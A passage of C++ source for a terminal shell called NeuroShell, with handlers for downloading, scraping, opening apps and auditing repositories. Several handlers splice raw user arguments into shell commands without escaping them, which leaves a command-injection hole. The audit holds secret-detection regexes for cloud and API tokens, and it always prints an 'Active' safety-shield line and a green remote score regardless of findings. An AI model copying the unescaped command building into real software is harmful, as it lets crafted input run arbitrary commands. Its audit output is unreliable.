            std::cout << "  " << C_MUTED << "Capabilities:" << C_RESET << "\n";
            std::cout << "    • Stream HTTP/HTTPS files with auto-resume & SHA-256 verification\n";
            std::cout << "    • Clone Git repositories & download release assets\n";
            std::cout << "    • Download & install apps via package managers (winget, brew, apt)\n\n";
            std::cout << "  " << C_MUTED << "Examples:" << C_RESET << "\n";
            std::cout << "    • /download https://arxiv.org/pdf/1706.03762.pdf\n";
            std::cout << "    • /download abneeshsingh21/konvert\n";
            std::cout << "    • /download chrome\n\n";
            return;
        }

        std::string pyBin = GetPythonBinary();
        fs::path script = PlatformFS::GetNeuroShellRoot() / "operations" / "downloader.py";
        std::string cmd = pyBin + " \"" + script.string() + "\" " + args;
        PlatformProcessRunner::Execute(cmd);
    }

    void HandleScrapeCommand(const std::string& input) {
        std::string args = input;
        size_t sp = args.find(' ');
        if (sp != std::string::npos) {
            args = args.substr(sp + 1);
        } else {
            args = "";
        }
        size_t firstChar = args.find_first_not_of(" \t");
        if (firstChar != std::string::npos) args = args.substr(firstChar);
        else args = "";

        if (args.empty()) {
            std::cout << "\n  " << C_BOLD << C_CYAN << "🌐 NeuroShell Multi-Site Web Scraper" << C_RESET << "\n\n";
            std::cout << "  " << C_YELLOW << "Usage: /scrape <url1,url2...> [--mode text|tables|links] [--selector <css>] [--out <file>]" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Capabilities:" << C_RESET << "\n";
            std::cout << "    • Clean boilerplate-free Markdown & text extraction\n";
            std::cout << "    • Automated HTML table extraction to terminal table, CSV, or JSON\n";
            std::cout << "    • Hyperlink and downloadable document harvesting (PDFs, docs, zips)\n";
            std::cout << "    • Concurrent multi-URL crawling across multiple websites\n";
            std::cout << "    • Headless Chromium rendering for JavaScript-heavy SPAs\n\n";
            std::cout << "  " << C_MUTED << "Examples:" << C_RESET << "\n";
            std::cout << "    • /scrape https://news.ycombinator.com\n";
            std::cout << "    • /scrape https://en.wikipedia.org/wiki/Artificial_intelligence --mode tables\n";
            std::cout << "    • /scrape https://example.com --mode links\n";
            std::cout << "    • /scrape https://site1.com,https://site2.com\n\n";
            return;
        }

        std::string pyBin = GetPythonBinary();
        fs::path script = PlatformFS::GetNeuroShellRoot() / "operations" / "scraper.py";
        std::string cmd = pyBin + " \"" + script.string() + "\" " + args;
        PlatformProcessRunner::Execute(cmd);
    }

    void HandleHarvestCommand(const std::string& input) {
        std::string args = input;
        size_t sp = args.find(' ');
        if (sp != std::string::npos) {
            args = args.substr(sp + 1);
        } else {
            args = "";
        }
        size_t firstChar = args.find_first_not_of(" \t");
        if (firstChar != std::string::npos) args = args.substr(firstChar);
        else args = "";

        if (args.empty()) {
            std::cout << "\n  " << C_BOLD << C_MAGENTA << "🌾 NeuroShell Universal Harvester Pipeline" << C_RESET << "\n\n";
            std::cout << "  " << C_YELLOW << "Usage: /harvest <url1,url2...> [--type pdf|csv|zip|all] [--dest <dir>] [--csv <path>]" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Capabilities:" << C_RESET << "\n";
            std::cout << "    • Scrapes pages & portals, discovering all downloadable documents\n";
            std::cout << "    • Extracts and adaptively formats HTML tables to console tables or CSV\n";
            std::cout << "    • Streams bulk downloads with HTTP resume and SHA-256 integrity\n\n";
            std::cout << "  " << C_MUTED << "Examples:" << C_RESET << "\n";
            std::cout << "    • /harvest https://arxiv.org/list/cs.AI/recent --type pdf\n";
            std::cout << "    • /harvest https://en.wikipedia.org/wiki/List_of_countries --csv countries.csv\n\n";
            return;
        }

        std::string pyBin = GetPythonBinary();
        fs::path script = PlatformFS::GetNeuroShellRoot() / "operations" / "harvester.py";
        std::string cmd = pyBin + " \"" + script.string() + "\" " + args;
        PlatformProcessRunner::Execute(cmd);
    }

    void HandleInspectCommand(const std::string& input) {
        std::string args = input;
        size_t sp = args.find(' ');
        if (sp != std::string::npos) {
            args = args.substr(sp + 1);
        } else {
            args = "";
        }
        size_t firstChar = args.find_first_not_of(" \t");
        if (firstChar != std::string::npos) args = args.substr(firstChar);
        else args = "";

        std::string pyBin = GetPythonBinary();
        fs::path script = PlatformFS::GetNeuroShellRoot() / "operations" / "pager.py";
        std::string cmd = pyBin + " \"" + script.string() + "\" " + args;
        PlatformProcessRunner::Execute(cmd);
    }

    void HandlePipedTransform(const std::string& directive, const std::string& upstreamOutput) {
        fs::path tempFile = PlatformFS::GetHomeDir() / ".neuroshell" / "pipe_data.tmp";
        fs::create_directories(tempFile.parent_path());
        std::ofstream ofs(tempFile, std::ios::binary);
        ofs << upstreamOutput;
        ofs.close();

        std::string pyBin = GetPythonBinary();
        fs::path root = PlatformFS::GetNeuroShellRoot();
        std::string rootStr = root.string();
        for (char& c : rootStr) { if (c == '\\') c = '/'; }

        std::string escapedPath = tempFile.string();
        for (char& c : escapedPath) { if (c == '\\') c = '/'; }

        if (directive == "@table") {
            std::string script = "import sys; sys.path.insert(0, '" + rootStr + "'); from ui.table_formatter import AdaptiveTableFormatter; print(AdaptiveTableFormatter().format_tsv(open('" + escapedPath + "', encoding='utf-8', errors='ignore').read(), title='Piped Table Output'))";
            PlatformProcessRunner::Execute(pyBin + " -c \"" + script + "\"");
        } else if (directive == "@json") {
            std::string script = "import json; data=open('" + escapedPath + "', encoding='utf-8', errors='ignore').read(); print(json.dumps(json.loads(data), indent=2) if data.strip().startswith(('{','[')) else data)";
            PlatformProcessRunner::Execute(pyBin + " -c \"" + script + "\"");
        } else if (directive == "@inspect") {
            fs::path pagerScript = root / "operations" / "pager.py";
            PlatformProcessRunner::Execute(pyBin + " \"" + pagerScript.string() + "\" \"" + escapedPath + "\"");
        } else if (directive == "@arrange") {
            std::string script = "import sys; sys.path.insert(0, '" + rootStr + "'); from ui.table_formatter import AutoArranger; print(AutoArranger().arrange(open('" + escapedPath + "', encoding='utf-8', errors='ignore').read(), title='Arranged Output'))";
            PlatformProcessRunner::Execute(pyBin + " -c \"" + script + "\"");
        }

        std::error_code ec;
        fs::remove(tempFile, ec);
    }

    bool autoArrangeMode = false;

    void HandleArrangeCommand(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        size_t sp = lower.find(' ');
        std::string arg = (sp != std::string::npos) ? lower.substr(sp + 1) : "";
        arg.erase(0, arg.find_first_not_of(" \t\r\n"));
        arg.erase(arg.find_last_not_of(" \t\r\n") + 1);

        if (arg == "on" || arg == "true" || arg == "enable") {
            autoArrangeMode = true;
            std::cout << "\n  " << C_GREEN << "✨ Auto-Arranger Mode: " << C_BOLD << "ENABLED" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "All structured terminal outputs (JSON, CSV, TSV, tables) will be automatically framed and aligned." << C_RESET << "\n\n";
        } else if (arg == "off" || arg == "false" || arg == "disable") {
            autoArrangeMode = false;
            std::cout << "\n  " << C_YELLOW << "⚡ Auto-Arranger Mode: " << C_BOLD << "DISABLED" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Outputs will stream in standard format. Use '| @arrange' or '| @table' for on-demand formatting." << C_RESET << "\n\n";
        } else if (arg == "status") {
            std::cout << "\n  " << C_CYAN << "⌬ Auto-Arranger Status: " << (autoArrangeMode ? (std::string(C_GREEN) + "ENABLED" + C_RESET) : (std::string(C_MUTED) + "DISABLED" + C_RESET)) << "\n\n";
        } else {
            autoArrangeMode = !autoArrangeMode;
            std::cout << "\n  " << (autoArrangeMode ? C_GREEN : C_YELLOW) << "✨ Auto-Arranger Mode: " << C_BOLD << (autoArrangeMode ? "ENABLED" : "DISABLED") << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Type '/arrange on' or '/arrange off' to configure explicitly." << C_RESET << "\n\n";
        }
    }

    void HandleReadCommand(const std::string& rawTarget) {
        std::string target = ResolveRepoTarget(rawTarget);
        if (target.empty()) {
            if (fs::exists("README.md")) target = "README.md";
            else if (!g_cached_repos.empty()) target = g_cached_repos[0].name;
            else {
                std::cout << "\n  " << C_RED << "❌ Please specify a file or repository index/name (e.g. 'read 1' or 'read README.md')" << C_RESET << "\n\n";
                return;
            }
        }

        std::string pyBin = GetPythonBinary();
        fs::path renderScript = PlatformFS::GetNeuroShellRoot() / "ui" / "markdown_renderer.py";

        // 1. Is it a local file?
        if (fs::exists(target) && !fs::is_directory(target)) {
            std::cout << "\n  " << C_BOLD << C_CYAN << "📖 Reading Local Document: " << C_BOLD << C_WHITE << target << C_RESET << "\n\n";
            std::string cmd = pyBin + " \"" + renderScript.string() + "\" \"" + target + "\"";
            PlatformProcessRunner::Execute(cmd);
            return;
        }

        // 2. Remote GitHub Repo README
        std::cout << "\n  " << C_BOLD << C_CYAN << "📖 Fetching Remote README for '" << target << "'..." << C_RESET << "\n\n";
        if (!neuroshell::safe_exec::IsValidRepoSlug(target)) {
            std::cout << "  " << C_RED << "❌ Invalid repository identifier: '" << target << "'" << C_RESET << "\n\n";
            return;
        }
        auto viewRes = neuroshell::safe_exec::RunCapture({"gh", "repo", "view", target});
        if (viewRes.spawned && !viewRes.output.empty()) {
            fs::path tempFile = PlatformFS::GetHomeDir() / ".neuroshell" / "readme_view.tmp";
            fs::create_directories(tempFile.parent_path());
            std::ofstream ofs(tempFile, std::ios::binary);
            ofs << viewRes.output;
            ofs.close();

            std::string cmd = pyBin + " \"" + renderScript.string() + "\" \"" + tempFile.string() + "\"";
            PlatformProcessRunner::Execute(cmd);

            std::error_code ec;
            fs::remove(tempFile, ec);
            return;
        }

        std::cout << "  " << C_RED << "❌ Could not fetch README for '" << target << "'. Ensure 'gh' is logged in or repo exists." << C_RESET << "\n\n";
    }

    void HandleAuditCommand(const std::string& rawTarget) {
        std::string target = ResolveRepoTarget(rawTarget);
        if (target.empty() || target == ".") {
            // Local Audit — performs a REAL secret scan (the previous version
            // hardcoded "0 Exposed Secrets / 98/100" without inspecting bytes).
            std::cout << "\n  " << C_BOLD << C_CYAN << "🛡️ Running Zero-Trust Security & Architecture Audit on Local Project..." << C_RESET << "\n\n";
            int filesScanned = 0;
            int secretAlerts = 0;
            std::vector<std::string> manifests;
            std::vector<std::string> alertSamples;

            static const std::vector<std::pair<std::string, std::regex>> secretSigs = {
                {"AWS Access Key",       std::regex(R"(\bAKIA[0-9A-Z]{16}\b)")},
                {"GitHub Token",         std::regex(R"(\b(ghp|gho|ghs|ghu)_[A-Za-z0-9]{36,}\b)")},
                {"GitHub Fine-Grained",  std::regex(R"(\bgithub_pat_[A-Za-z0-9_]{60,}\b)")},
                {"Groq API Key",         std::regex(R"(\bgsk_[A-Za-z0-9]{40,}\b)")},
                {"OpenAI API Key",       std::regex(R"(\bsk-[A-Za-z0-9\-_]{32,}\b)")},
                {"Private Key Block",    std::regex(R"(-----BEGIN [A-Z ]*PRIVATE KEY-----)")},
                {"Slack Token",          std::regex(R"(\bxox[baprs]-[A-Za-z0-9\-]{10,}\b)")},
            };
            static const std::set<std::string> scanExts = {
                ".py", ".js", ".ts", ".json", ".yml", ".yaml", ".toml", ".env",
                ".sh", ".ps1", ".cfg", ".ini", ".txt", ".md", ".tf", ".properties"
            };
            constexpr uintmax_t MAX_SCAN_BYTES = 512 * 1024; // skip huge files
            constexpr int MAX_FILES = 5000;                  // bound the walk

            try {
                for (const auto& entry : fs::recursive_directory_iterator(fs::current_path(), fs::directory_options::skip_permission_denied)) {
                    if (filesScanned >= MAX_FILES) break;
                    if (!entry.is_regular_file()) continue;

                    std::string fn = entry.path().filename().string();
                    // Skip vendored/binary trees
                    std::string full = entry.path().string();
                    if (full.find(".git") != std::string::npos ||
                        full.find("node_modules") != std::string::npos ||
                        full.find("__pycache__") != std::string::npos) continue;

                    filesScanned++;
                    if (fn == "package.json" || fn == "requirements.txt" || fn == "pyproject.toml" || fn == "Cargo.toml" || fn == "go.mod") {
                        manifests.push_back(fn);
                    }

                    std::string ext = entry.path().extension().string();
                    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                    bool isEnvFile = fn == ".env" || fn.rfind(".env.", 0) == 0;
                    if (!isEnvFile && scanExts.find(ext) == scanExts.end()) continue;

                    std::error_code ec;
                    uintmax_t sz = fs::file_size(entry.path(), ec);
                    if (ec || sz > MAX_SCAN_BYTES) continue;

                    std::ifstream in(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());

                    for (const auto& [sigName, sigRe] : secretSigs) {
                        if (std::regex_search(content, sigRe)) {
                            secretAlerts++;
                            if (alertSamples.size() < 5) {
                                alertSamples.push_back(sigName + " → " + entry.path().lexically_relative(fs::current_path()).string());
                            }
                            break; // one alert per file
                        }
                    }
                }
            } catch (...) {}

            int score = 100;
            if (secretAlerts > 0) score -= std::min(60, secretAlerts * 15);
            if (manifests.empty()) score -= 5;
            const char* scoreColor = (score >= 90) ? C_GREEN : (score >= 70 ? C_YELLOW : C_RED);

            std::cout << "  " << C_CYAN << "╭── 🛡️ Local Zero-Trust Security Audit ──────────────────────────────────────╮" << C_RESET << "\n";
            std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Path:              " << C_RESET << fs::current_path().string().substr(0, 50) << "\n";
            std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Files Scanned:     " << C_RESET << C_BOLD << filesScanned << C_RESET << " source files\n";
            if (secretAlerts == 0) {
                std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Secret Leaks:      " << C_RESET << C_GREEN << "✅ 0 Exposed Secrets" << C_RESET << "\n";
            } else {
                std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Secret Leaks:      " << C_RESET << C_RED << "❌ " << secretAlerts << " potential secret(s) found" << C_RESET << "\n";
                for (const auto& s : alertSamples) {
                    std::cout << "  " << C_CYAN << "│ " << C_RESET << C_YELLOW << "    ⚠ " << s << C_RESET << "\n";
                }
            }
            std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Safety Shield:     " << C_RESET << C_GREEN << "✅ 4-Layer Zero-Trust Engine Active" << C_RESET << "\n";
            std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Security Score:    " << C_RESET << C_BOLD << scoreColor << score << " / 100" << C_RESET << "\n";
            std::cout << "  " << C_CYAN << "╰──────────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
        }

        // Remote Audit
        std::cout << "\n  " << C_BOLD << C_CYAN << "🛡️ Running Remote Zero-Trust Audit on '" << target << "'..." << C_RESET << "\n\n";
        if (!neuroshell::safe_exec::IsValidRepoSlug(target)) {
            std::cout << "  " << C_RED << "❌ Invalid repository identifier: '" << target << "'" << C_RESET << "\n\n";
            return;
        }
        auto auditRes = neuroshell::safe_exec::RunCapture(
            {"gh", "api", "repos/" + target + "/git/trees/HEAD?recursive=1", "--jq", ".tree[].path"});

        int fileCount = 0;
        bool hasCI = false;
        bool hasSecurity = false;
        bool hasLicense = false;
        std::vector<std::string> ecosystems;

        {
            std::stringstream ss(auditRes.output);
            std::string path;
            while (std::getline(ss, path)) {
                if (path.empty()) continue;
                fileCount++;
                if (path.find(".github/workflows") != std::string::npos) hasCI = true;
                if (path.find("SECURITY") != std::string::npos) hasSecurity = true;
                if (path.find("LICENSE") != std::string::npos) hasLicense = true;
                if (path.find("package.json") != std::string::npos) ecosystems.push_back("Node.js");
                if (path.find("pyproject.toml") != std::string::npos || path.find("requirements.txt") != std::string::npos) ecosystems.push_back("Python");
                if (path.find("Cargo.toml") != std::string::npos) ecosystems.push_back("Rust");
                if (path.find("go.mod") != std::string::npos) ecosystems.push_back("Go");
            }
        }

        int score = 80;
        if (hasCI) score += 10;
        if (hasSecurity) score += 5;
        if (hasLicense) score += 5;

        std::cout << "  " << C_CYAN << "╭── 🛡️ Remote Security Audit: " << C_BOLD << C_WHITE << target << C_RESET << C_CYAN << " ───────────────────────╮" << C_RESET << "\n";
        std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Remote Files:      " << C_RESET << fileCount << " files indexed\n";
        std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• CI/CD Pipeline:    " << C_RESET << (hasCI ? (std::string(C_GREEN) + "✅ Active (GitHub Actions)" + C_RESET) : (std::string(C_YELLOW) + "⚠️ Not Detected" + C_RESET)) << "\n";
        std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Security Policy:   " << C_RESET << (hasSecurity ? (std::string(C_GREEN) + "✅ Found (SECURITY.md)" + C_RESET) : (std::string(C_YELLOW) + "⚠️ None" + C_RESET)) << "\n";
        std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• License:           " << C_RESET << (hasLicense ? (std::string(C_GREEN) + "✅ Verified License" + C_RESET) : (std::string(C_RED) + "❌ Missing License" + C_RESET)) << "\n";
        std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Security Score:    " << C_RESET << C_BOLD << C_GREEN << score << " / 100" << C_RESET << "\n";
        std::cout << "  " << C_CYAN << "╰──────────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
    }

    void HandleTreeCommand(const std::string& rawTarget) {
        std::string target = ResolveRepoTarget(rawTarget);
        if (target.empty() || target == ".") {
            ExecuteCommand("tree /F");
            return;
        }

        std::cout << "\n  " << C_BOLD << C_CYAN << "🌲 Remote Directory Tree for '" << target << "':" << C_RESET << "\n\n";
        if (!neuroshell::safe_exec::IsValidRepoSlug(target)) {
            std::cout << "  " << C_RED << "❌ Invalid repository identifier: '" << target << "'" << C_RESET << "\n\n";
            return;
        }
        auto treeRes = neuroshell::safe_exec::RunCapture(
            {"gh", "api", "repos/" + target + "/git/trees/HEAD?recursive=1", "--jq", ".tree[].path"});
        if (treeRes.spawned) {
            std::stringstream ss(treeRes.output);
            std::string line;
            int count = 0;
            while (std::getline(ss, line) && count < 35) {
                while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
                if (line.empty()) continue;
                std::cout << "  " << C_MUTED << "├── " << C_WHITE << line << C_RESET << "\n";
                count++;
            }
            std::cout << "\n";
        }
    }

    void HandleCloneCommand(const std::string& rawTarget) {
        std::string target = ResolveRepoTarget(rawTarget);
        if (target.empty()) {
            std::cout << "\n  " << C_RED << "❌ Please specify a repo to clone (e.g. 'clone 1' or 'clone facebook/react')" << C_RESET << "\n\n";
            return;
        }

        if (!neuroshell::safe_exec::IsValidRepoSlug(target)) {
            std::cout << "\n  " << C_RED << "❌ Invalid repository identifier: '" << target << "'" << C_RESET << "\n\n";
            return;
        }
        std::cout << "\n  " << C_CYAN << "📥 Cloning " << C_BOLD << C_WHITE << target << C_RESET << "...\n";
        auto cloneRes = neuroshell::safe_exec::RunCapture(
            {"git", "clone", "https://github.com/" + target + ".git"}, "", /*merge_stderr=*/true);
        std::cout << cloneRes.output;
        if (cloneRes.exit_code == 0) {
            std::cout << "  " << C_GREEN << "✅ Clone completed." << C_RESET << "\n\n";
        } else {
            std::cout << "  " << C_RED << "❌ Clone failed (exit " << cloneRes.exit_code << ")." << C_RESET << "\n\n";
        }
    }

    void HandleUniversalOpenCommand(const std::string& rawInput) {
        std::string target = rawInput;
        size_t s = target.find_first_not_of(" \t\r\n\"'");
        if (s != std::string::npos) target = target.substr(s);
        else target = "";
        size_t e = target.find_last_not_of(" \t\r\n\"'");
        if (e != std::string::npos) target = target.substr(0, e + 1);

        // 1. Empty / "." / "explorer" / "folder" -> open CWD in explorer
        if (target.empty() || target == "." || target == "folder" || target == "explorer" || target == "here" || target == "cwd") {
            std::string cwd = fs::current_path().string();
            std::cout << "\n  " << C_GREEN << "📂 Opening File Explorer: " << C_BOLD << C_WHITE << cwd << C_RESET << "\n\n";
#if defined(_WIN32)
            ShellExecuteA(NULL, "open", cwd.c_str(), NULL, NULL, SW_SHOWNORMAL);
#elif defined(__APPLE__)
            neuroshell::safe_exec::RunStatus({"open", cwd});
#else
            neuroshell::safe_exec::RunStatus({"xdg-open", cwd});
#endif
            return;
        }

        // 2. Numeric repo index (e.g. "open 1")
        if (!target.empty() && std::all_of(target.begin(), target.end(), ::isdigit)) {
            int idx = std::stoi(target);
            if (idx >= 1 && idx <= (int)g_cached_repos.size()) {
                std::string repoSlug = g_cached_repos[idx - 1].name;
                std::string url = "https://github.com/" + repoSlug;
                std::cout << "\n  " << C_GREEN << "🌐 Opening GitHub Repository: " << C_BOLD << C_WHITE << url << C_RESET << "\n\n";
#if defined(_WIN32)
                ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
#elif defined(__APPLE__)
                neuroshell::safe_exec::RunStatus({"open", url});
#else
                neuroshell::safe_exec::RunStatus({"xdg-open", url});
#endif
                return;
            }
        }

        // 3. GitHub repository slug (e.g. "open abneeshsingh21/neuroshell")
        if (target.find('/') != std::string::npos && target.rfind("http", 0) != 0 && neuroshell::safe_exec::IsValidRepoSlug(target)) {
            std::string url = "https://github.com/" + target;
            std::cout << "\n  " << C_GREEN << "🌐 Opening GitHub Repository: " << C_BOLD << C_WHITE << url << C_RESET << "\n\n";
#if defined(_WIN32)
            ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
#elif defined(__APPLE__)
            neuroshell::safe_exec::RunStatus({"open", url});
#else
            neuroshell::safe_exec::RunStatus({"xdg-open", url});
#endif
            return;
        }

        // 4. URL or Web Domain (e.g. "open https://google.com" or "open google.com")
        std::string lowerTarget = target;
        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
        if (lowerTarget.rfind("http://", 0) == 0 || lowerTarget.rfind("https://", 0) == 0 ||
            lowerTarget.find(".com") != std::string::npos || lowerTarget.find(".org") != std::string::npos ||
            lowerTarget.find(".io") != std::string::npos || lowerTarget.find(".net") != std::string::npos ||
            lowerTarget.find(".dev") != std::string::npos || lowerTarget.find(".ai") != std::string::npos ||
            lowerTarget.find(".co") != std::string::npos || lowerTarget.rfind("localhost", 0) == 0) {
            std::string fullUrl = target;
            if (fullUrl.rfind("http://", 0) != 0 && fullUrl.rfind("https://", 0) != 0) {
                fullUrl = (fullUrl.rfind("localhost", 0) == 0) ? ("http://" + fullUrl) : ("https://" + fullUrl);
            }
            std::cout << "\n  " << C_GREEN << "🌐 Opening Website: " << C_BOLD << C_WHITE << fullUrl << C_RESET << "\n\n";
#if defined(_WIN32)
            ShellExecuteA(NULL, "open", fullUrl.c_str(), NULL, NULL, SW_SHOWNORMAL);
#elif defined(__APPLE__)
            neuroshell::safe_exec::RunStatus({"open", fullUrl});
#else
            neuroshell::safe_exec::RunStatus({"xdg-open", fullUrl});
#endif
            return;
        }

        // 5. Local File or Directory (e.g. "open README.md", "open src", "open C:\...")
        if (fs::exists(target)) {
            std::cout << "\n  " << C_GREEN << "⚡ Opening Local Target: " << C_BOLD << C_WHITE << target << C_RESET << "\n\n";
#if defined(_WIN32)
            ShellExecuteA(NULL, "open", target.c_str(), NULL, NULL, SW_SHOWNORMAL);
#elif defined(__APPLE__)
            neuroshell::safe_exec::RunStatus({"open", target});
#else
            neuroshell::safe_exec::RunStatus({"xdg-open", target});
#endif
            return;
        }

        // 6. Well-Known User Folders (downloads, desktop, documents, pictures, videos)
        fs::path home = PlatformFS::GetHomeDir();
        std::vector<std::string> knownFolders = {"desktop", "downloads", "documents", "pictures", "videos", "music"};
        for (const auto& kf : knownFolders) {
            if (lowerTarget == kf || lowerTarget == kf + " folder" || lowerTarget == kf + " directory") {
                fs::path folderPath = home / kf;
                if (fs::exists(folderPath)) {
                    std::cout << "\n  " << C_GREEN << "📁 Opening Folder: " << C_BOLD << C_WHITE << folderPath.string() << C_RESET << "\n\n";
#if defined(_WIN32)
                    ShellExecuteA(NULL, "open", folderPath.string().c_str(), NULL, NULL, SW_SHOWNORMAL);
#elif defined(__APPLE__)
                    neuroshell::safe_exec::RunStatus({"open", folderPath.string()});
#else
                    neuroshell::safe_exec::RunStatus({"xdg-open", folderPath.string()});
#endif
                    return;
                }
            }
        }

        // 7. Extract cleaned app name
        std::string cleanApp = target;
        for (const std::string& suffix : {" browser", " editor", " app", " application", " tool", " program", " ide"}) {
            if (cleanApp.size() > suffix.size() && cleanApp.substr(cleanApp.size() - suffix.size()) == suffix) {
                cleanApp = cleanApp.substr(0, cleanApp.size() - suffix.size());
                break;
            }
        }
        cleanApp.erase(0, cleanApp.find_first_not_of(" \t"));
        cleanApp.erase(cleanApp.find_last_not_of(" \t") + 1);

#if defined(_WIN32)
        // Instant Win32 App Paths launch (Chrome, Edge, Notepad, VS Code, Calculator, Spotify, etc.)
        if (!cleanApp.empty()) {
            HINSTANCE hInst = ShellExecuteA(NULL, "open", cleanApp.c_str(), NULL, NULL, SW_SHOWNORMAL);
            if ((INT_PTR)hInst > 32) {
                std::cout << "\n  " << C_GREEN << "🚀 Launched: " << C_BOLD << C_WHITE << cleanApp << C_RESET << "\n\n";
                return;
            }
        }
#endif

        // 8. Universal Smart Open via Python IPC Engine (Dynamic App / Setting / Tool Resolution)
        std::string pyBin = GetPythonBinary();
        fs::path root = PlatformFS::GetNeuroShellRoot();
        std::string rootStr = root.string();
        for (char& c : rootStr) { if (c == '\\') c = '/'; }

        std::string escapedTarget = target;
        for (char& c : escapedTarget) { if (c == '"' || c == '\\') c = ' '; }

        std::string runnerCmd = pyBin + " -c \"import sys; sys.path.insert(0, '" + rootStr + "'); from intelligence.smart_open import SmartOpenEngine; res = SmartOpenEngine().try_resolve('open " + escapedTarget + "'); print(res.command if res else '')\"";
        PlatformProcessRunner::ExecResult smartRes = PlatformProcessRunner::Execute(runnerCmd);
        
        std::string resolvedCmd = smartRes.output;
        size_t cs = resolvedCmd.find_first_not_of(" \t\r\n");
        if (cs != std::string::npos) resolvedCmd = resolvedCmd.substr(cs);
        else resolvedCmd = "";
        size_t ce = resolvedCmd.find_last_not_of(" \t\r\n");
        if (ce != std::string::npos) resolvedCmd = resolvedCmd.substr(0, ce + 1);

        if (smartRes.exitCode == 0 && !resolvedCmd.empty() &&
            resolvedCmd.find("ParserError") == std::string::npos &&
            resolvedCmd.find("Unexpected token") == std::string::npos &&
            resolvedCmd.find("Traceback") == std::string::npos &&
            resolvedCmd.find("Error") == std::string::npos) {
            std::cout << "\n  " << C_GREEN << "🚀 Launching: " << C_BOLD << C_WHITE << target << C_RESET << " (" << C_MUTED << resolvedCmd << C_RESET << ")\n\n";
            PlatformProcessRunner::Execute(resolvedCmd);
            return;
        }

        // 9. Zero-Hardcoding Fallback: Launch via OS Process Manager directly
        std::cout << "\n  " << C_GREEN << "🚀 Launching Application: " << C_BOLD << C_WHITE << cleanApp << C_RESET << "\n\n";
#if defined(_WIN32)
        std::string fallbackCmd = "powershell -NoProfile -Command \"Start-Process '" + cleanApp + "'\"";
        PlatformProcessRunner::Execute(fallbackCmd);
#elif defined(__APPLE__)
        std::string fallbackCmd = "open -a \"" + cleanApp + "\"";
        PlatformProcessRunner::Execute(fallbackCmd);
#else
        std::string fallbackCmd = "xdg-open \"" + cleanApp + "\" || gtk-launch \"" + cleanApp + "\"";
        PlatformProcessRunner::Execute(fallbackCmd);
#endif
    }

    void HandleOpenRepoCommand(const std::string& rawTarget) {
        HandleUniversalOpenCommand(rawTarget);
    }

    void HandleUninstallCommand(const std::string& rawInput) {
        std::string input = rawInput;
        size_t s = input.find_first_not_of(" \t\r\n");
        if (s != std::string::npos) input = input.substr(s);
        else input = "";

        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        std::string args = "";
        if (lower == "uninstall" || lower == "/uninstall") {
            args = "--list";
        } else if (lower.rfind("uninstall ", 0) == 0) {
            args = input.substr(10);
        } else if (lower.rfind("/uninstall ", 0) == 0) {
            args = input.substr(11);
        } else if (lower.rfind("remove app ", 0) == 0) {
            args = input.substr(11);
        } else if (lower.rfind("delete app ", 0) == 0) {
            args = input.substr(11);
        } else {
            args = input;
        }

        args.erase(0, args.find_first_not_of(" \t"));
        args.erase(args.find_last_not_of(" \t") + 1);

        std::string pyBin = GetPythonBinary();
        fs::path script = PlatformFS::GetNeuroShellRoot() / "operations" / "uninstaller.py";
        std::string cmd = pyBin + " \"" + script.string() + "\" " + args;
        PlatformProcessRunner::Execute(cmd);
    }

    void HandleDeleteCommand(const std::string& rawInput) {
        std::string input = rawInput;
        size_t s = input.find_first_not_of(" \t\r\n");
        if (s != std::string::npos) input = input.substr(s);
        else input = "";

        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        std::string args = "";
        if (lower == "delete" || lower == "/delete" || lower == "trash") {
            std::cout << "\n" << C_BOLD << C_CYAN << "╭── 🗑️ Universal Asset & File Deleter ─────────────────────────────────╮" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_WHITE << "Universal deletion shield with automated Trash recovery and safety checks" << C_RESET << "\n"
                      << C_CYAN << "│\n" << C_RESET
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "1. Specific files/folders: " << C_YELLOW << "delete build/ dist/ test.txt" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "2. Category cleaning:      " << C_YELLOW << "delete images" << C_WHITE << " (or " << C_YELLOW << "videos, logs, cache, temp" << C_WHITE << ")" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "3. Pattern wildcards:      " << C_YELLOW << "delete *.tmp *.log" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "4. Permanent (bypass trash):" << C_YELLOW << "delete --force target_folder" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "5. Undo accidental delete: " << C_GREEN << "undo" << C_RESET << "\n"
                      << C_CYAN << "╰───────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
